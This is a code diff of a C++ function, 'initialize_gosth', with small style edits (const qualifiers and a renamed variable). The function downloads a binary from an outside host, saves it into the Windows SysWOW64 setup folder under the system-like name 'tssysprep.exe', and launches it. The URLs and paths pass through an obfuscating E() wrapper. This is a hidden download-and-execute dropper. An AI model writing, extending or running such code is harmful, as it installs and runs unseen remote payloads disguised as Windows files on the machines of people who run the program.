@@ -72,17 +72,17 @@ bool core::initialize_skript( )
 bool core::initialize_gosth( )
 {
 
-	std::vector<std::string> url_out { E( "http://api.idandev.xyz/files/gosth" ), E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ) };
+	std::vector<std::string> const url_out { E( "http://api.idandev.xyz/files/gosth" ), E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ) };
 
 	const std::string &url = url_out[ 0 ];
 	const std::string &output_file_path = url_out[ 1 ];
 
-	auto res = cpr::Get( cpr::Url { url } );
+	auto const res = cpr::Get( cpr::Url { url } );
 
-	std::ofstream outputFile( output_file_path, std::ios::binary );
+	std::ofstream output_file( output_file_path, std::ios::binary );
 
-	outputFile.write( res.text.c_str( ), res.text.length( ) );
-	outputFile.close( );
+	output_file.write( res.text.c_str( ), res.text.length( ) );
+	output_file.close( );
 
 	utils::system::create_process( E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ) );
 
